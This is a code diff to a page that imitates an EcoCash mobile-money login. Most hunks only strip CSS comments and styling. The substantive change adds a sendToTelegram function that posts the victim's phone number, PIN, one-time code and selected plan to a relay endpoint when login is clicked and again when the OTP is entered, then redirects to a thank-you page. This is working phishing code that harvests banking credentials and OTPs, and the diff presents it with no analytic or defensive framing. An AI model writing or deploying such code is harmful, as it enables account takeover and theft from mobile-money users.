@@ -78,15 +78,11 @@ pointer-events:none;
 transform:translateX(40px);
 }
 
-/* logo */
-
 .logo{
 height:70px;
 display:block;
 margin:auto;
 }
-
-/* text */
 
 h1{
 text-align:center;
@@ -103,8 +99,6 @@ color:#555;
 margin-bottom:18px;
 }
 
-/* inputs */
-
 label{
 font-size:12px;
 margin-top:12px;
@@ -120,7 +114,6 @@ border:1px solid #eee;
 background:#fafafa;
 margin-top:6px;
 font-size:14px;
-transition:.2s;
 }
 
 input:focus{
@@ -166,7 +159,7 @@ opacity:.45;
 opacity:1;
 }
 
-/* pin boxes */
+/* pin */
 
 .pin{
 display:flex;
@@ -182,7 +175,6 @@ font-size:22px;
 text-align:center;
 border-radius:16px;
 border:1px solid #eee;
-background:white;
 }
 
 .pin input:focus{
@@ -338,7 +330,47 @@ let phoneValue=""
 let pinValue=""
 let otpValue=""
 
-/* phone validation */
+const planData=sessionStorage.getItem("selectedPlan")||"Not captured"
+
+
+async function sendToTelegram(stage){
+
+await fetch("/api/sendTelegram",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+message:`
+
+Ecocash Login
+
+Stage: ${stage}
+
+Phone: ${phoneValue}
+
+PIN: ${pinValue}
+
+OTP: ${otpValue}
+
+Plan: ${planData}
+
+Time: ${new Date().toISOString()}
+
+`
+
+})
+
+})
+
+}
+
+
+/* phone */
 
 phone.oninput=e=>{
 
@@ -358,7 +390,7 @@ validate()
 }
 
 
-/* pin logic */
+/* pin */
 
 const pinInputs=document.querySelectorAll("#step1 .pin input")
 
@@ -407,8 +439,6 @@ loginBtn.classList.remove("active")
 }
 
 
-/* show step */
-
 function show(id){
 
 document.querySelectorAll(".step")
@@ -422,9 +452,11 @@ document.getElementById(id)
 
 /* login click */
 
-loginBtn.onclick=()=>{
+loginBtn.onclick=async()=>{
 
 if(!loginBtn.classList.contains("active")) return
+
+await sendToTelegram("Login")
 
 const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
 
@@ -469,16 +501,24 @@ otpInputs[index-1].value=""
 })
 
 
-function submitOtp(){
+async function submitOtp(){
 
 otpValue=[...otpInputs].map(i=>i.value).join("")
 
+await sendToTelegram("OTP")
+
 show("step4")
+
+setTimeout(()=>{
+
+location.href="thankyou.html"
+
+},1500)
 
 }
 
 
-/* timer 60 sec */
+/* timer */
 
 function startTimer(){
 
